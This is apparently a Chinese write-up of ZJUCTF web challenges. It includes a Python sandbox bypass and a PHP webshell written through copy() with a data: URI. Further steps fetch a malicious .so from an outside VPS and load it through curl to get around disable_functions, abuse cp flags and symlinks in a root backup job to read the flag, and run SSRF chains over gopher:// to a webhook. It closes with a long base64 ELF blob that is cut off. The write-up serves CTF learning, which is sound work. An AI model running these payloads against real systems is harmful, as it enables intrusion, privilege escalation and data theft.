<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import sandbox</span><br><span class="line">R_OK = 4</span><br><span class="line">def access(path, mode)&#123;</span><br><span class="line">    return False</span><br><span class="line">&#125;</span><br><span class="line">def chroot(*args, **kwargs)&#123;</span><br><span class="line">    return None</span><br><span class="line">&#125;</span><br><span class="line">def chdir(*args, **kwargs)&#123;</span><br><span class="line">    return None</span><br><span class="line">&#125;</span><br><span class="line">def setgid(*args, **kwargs)&#123;</span><br><span class="line">    return None</span><br><span class="line">&#125;</span><br><span class="line">def setuid(*args, **kwargs)&#123;</span><br><span class="line">    return None</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再上传getflag.by</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sandbox</span><br><span class="line">print(open(&quot;/flag&quot;,&quot;r&quot;).read().strip())</span><br></pre></td></tr></table></figure>

<p>run一下getflag.by即可</p>
<p>ZJUCTF{python_is_b_or_bython_is_p_c3b52a3652c5}</p>
<h3 id="CoPHPy"><a href="#CoPHPy" class="headerlink" title="CoPHPy"></a>CoPHPy</h3><p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ?? <span class="string">&#x27;hello.txt&#x27;</span>, <span class="string">&#x27;./backup/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">@<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>copy函数的参数是可以传入伪协议的，因此可以这样子写入一个webshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data:,&lt;%3F%3D%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F&gt;.php</span><br></pre></td></tr></table></figure>

<p>访问 <code>/backup/data:,&lt;%3F%3D%40eval(%24_POST[&#39;cmd&#39;])%3B%3F&gt;.php</code> 即可用post方式传入cmd执行命令</p>
<p>然后flag不在环境变量，并且发现有open_basedir和disable_functions，php版本是8.4.14</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open_basedir</span><br><span class="line">/var/www/html:/tmp</span><br><span class="line"></span><br><span class="line">disable_functions</span><br><span class="line">opendir,readdir,scandir,fopen,fsockopen,fwrite,fread,file,file_get_contents,file_put_contents,move_uploaded_file,delete,rename,rmdir,touch,unlink,mkdir,readfile,readlink,realpath,parse_ini_file,glob,putenv,chroot,chgrp,chown,chdir,mkdir,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,readlink,symlink,link,unlink,syslog,imap_open,dl,mail,imap_mail,mb_send_mail,error_log,error_reporting,ini_set,ini_alter,ini_restore,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,pfsockopen,stream_socket_server,set_include_path,spl_autoload_register,apache_setenv,set_error_handler,stream_filter_register,gc_collect_cycles</span><br></pre></td></tr></table></figure>

<p>先确认了一下&#x2F;var&#x2F;www&#x2F;html里面没有有用的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator(&#x27;/var/www/html&#x27;,FilesystemIterator::SKIP_DOTS));foreach($it as $f)&#123;if($f-&gt;isFile())echo $f-&gt;getPathname().&quot;\n&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>发现没有ban curl相关函数，并且留了copy，那么就是抄的XCTF-final的那道kidding，用curl加载so实现RCE</p>
<p>1.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__attribute__((__constructor__)) <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;ls / -al &gt; /var/www/html/1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -O2 1.c -o 1.so</span><br></pre></td></tr></table></figure>

<p>用copy把恶意so复制到&#x2F;tmp&#x2F;1.so</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=copy(&#x27;http://vps:8000/1.so&#x27;,&#x27;/tmp/1.so&#x27;);var_dump(file_exists(&#x27;/tmp/1.so&#x27;));</span><br></pre></td></tr></table></figure>

<p>用curl去加载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=$so=&#x27;/tmp/1.so&#x27;;$ch=curl_init();curl_setopt($ch,CURLOPT_URL,&#x27;http://127.0.0.1&#x27;);curl_setopt($ch,CURLOPT_SSLENGINE,$so);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_exec($ch);curl_close($ch);</span><br></pre></td></tr></table></figure>

<p>访问<a target="_blank" rel="noopener" href="http://localhost:61234/1%E7%9F%A5%E9%81%93flag%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%BF%98%E8%A6%81%E6%8F%90%E6%9D%83">http://localhost:61234/1知道flag路径，并且还要提权</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">total 68</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 18 15:57 .</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 18 15:57 ..</span><br><span class="line">lrwxrwxrwx    1 root root    7 Aug 24 16:20 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    2 root root 4096 Aug 24 16:20 boot</span><br><span class="line">drwxr-xr-x    5 root root  360 Nov 18 15:57 dev</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 18 15:57 etc</span><br><span class="line">-r--------    1 root root   41 Nov 18 15:57 flag_Spw58HtetbVIkrmf</span><br><span class="line">drwxr-xr-x    2 root root 4096 Aug 24 16:20 home</span><br><span class="line">lrwxrwxrwx    1 root root    7 Aug 24 16:20 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    1 root root    9 Aug 24 16:20 lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct 20 00:00 media</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct 20 00:00 mnt</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct 20 00:00 opt</span><br><span class="line">dr-xr-xr-x 2887 root root    0 Nov 18 15:57 proc</span><br><span class="line">drwx------    2 root root 4096 Oct 20 00:00 root</span><br><span class="line">drwxr-xr-x    1 root root 4096 Nov 18 15:57 run</span><br><span class="line">lrwxrwxrwx    1 root root    8 Aug 24 16:20 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    2 root root 4096 Oct 20 00:00 srv</span><br><span class="line">dr-xr-xr-x   13 root root    0 Nov 18 13:17 sys</span><br><span class="line">drwxrwxrwt    1 root root 4096 Nov 18 16:35 tmp</span><br><span class="line">drwxr-xr-x    1 root root 4096 Oct 20 00:00 usr</span><br><span class="line">drwxr-xr-x    1 root root 4096 Oct 24 19:21 var</span><br></pre></td></tr></table></figure>

<p>先弹个shell，发现index.php是root权限运行的，但是也没用</p>
<p>重点来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@php-copy-3a25b194917449d5:/var$ ps -aux</span><br><span class="line">ps -aux</span><br><span class="line">USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root           1  0.0  0.0 190164 28820 ?        Ss   15:57   0:00 apache2 -DFOREGROUND</span><br><span class="line">root          15  0.0  0.0   2680  1536 ?        S    15:57   0:00 sh -c cd /var/www/html; while true; do sleep 30; cp -dup * backup; done</span><br></pre></td></tr></table></figure>

<p>有一个定时任务会不断备份&#x2F;var&#x2F;www&#x2F;html目录下的文件到backup目录下<br>那么很显然走符号链接那套流程了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;111&quot; &gt; &quot;-L&quot;</span><br><span class="line">echo &quot;222&quot; &gt; &quot;--no-preserve=mode,ownership&quot;</span><br><span class="line">ln -s /flag_Spw58HtetbVIkrmf flag.txt</span><br></pre></td></tr></table></figure>

<p>等30秒，访问&#x2F;backup&#x2F;flag.txt即可</p>
<p>ZJUCTF{you_can_really_copy_04c3bf070b93}</p>
<h3 id="結束バンドの試練-波奇篇"><a href="#結束バンドの試練-波奇篇" class="headerlink" title="結束バンドの試練 - 波奇篇"></a>結束バンドの試練 - 波奇篇</h3><p>3300的PHP和3000的nodejs都是有个ssrf点，但是nodejs里有个ssrfcheck</p>
<p>一个让内网nodejs去访问webhook的例子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=gopher://localhost:3000/_GET%2520%252Fvisit%253Furl%253D%2509https%253A%252F%252Fwebhook%252Esite%252Fcc2386bf%252D053e%252D44d0%252D8318%252D0a623b0e8ecc%2520HTTP%252F1%252E1%250D%250AHost%253A%2520localhost%253A3000%250D%250AConnection%253A%2520close%250D%250A HTTP/1.1</span><br><span class="line">Host: localhost:3300</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: lang=zh-CN</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>c+rust触发&#x2F;tmp&#x2F;heart.sh这条路已经打通</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://localhost:3301/_POST%2520http%253A%252F%252F127%252E0%252E0%252E1%253A3302%252Finternel%2520HTTP%252F1%252E1%250D%250AHost%253A%2520127%252E0%252E0%252E1%253A3302%250D%250AContent%252DType%253A%2520application%252Fx%252Dwww%252Dform%252Durlencoded%250D%250AContent%252DLength%253A%252044%250D%250A%250D%250Ax%253Drun%250D%250A%250D%250A</span><br></pre></td></tr></table></figure>

<p>发现docker日志中&#x2F;tmp&#x2F;heart.sh一直执行不了</p>
<p>可以直接写入一个可执行文件</p>
<p>shell.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> result = system(<span class="string">&quot;echo 111 &gt; /tmp/log.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o 111 shell.c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPMPHvpIg+wISIsF2S8AAEiFwHQC/9BIg8QIwwAAAAAA/zWaLwAA8v8lmy8AAA8fAPMPHvpoAAAAAPLp4f///5DzDx768v8lrS8AAA8fRAAA8w8e+vL/JXUvAAAPH0QAAPMPHvox7UmJ0V5IieJIg+TwUFRFMcAxyUiNPcoAAAD/FVMvAAD0Zi4PH4QAAAAAAEiNPXkvAABIjQVyLwAASDn4dBVIiwU2LwAASIXAdAn/4A8fgAAAAADDDx+AAAAAAEiNPUkvAABIjTVCLwAASCn+SInwSMHuP0jB+ANIAcZI0f50FEiLBQUvAABIhcB0CP/gZg8fRAAAww8fgAAAAADzDx76gD0FLwAAAHUrVUiDPeIuAAAASInldAxIiz3mLgAA6Bn////oZP///8YF3S4AAAFdww8fAMMPH4AAAAAA8w8e+ul3////8w8e+lVIieVIg+wQSI0FqA4AAEiJx+js/v//iUX8uAAAAADJwwAA8w8e+kiD7AhIg8QIwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA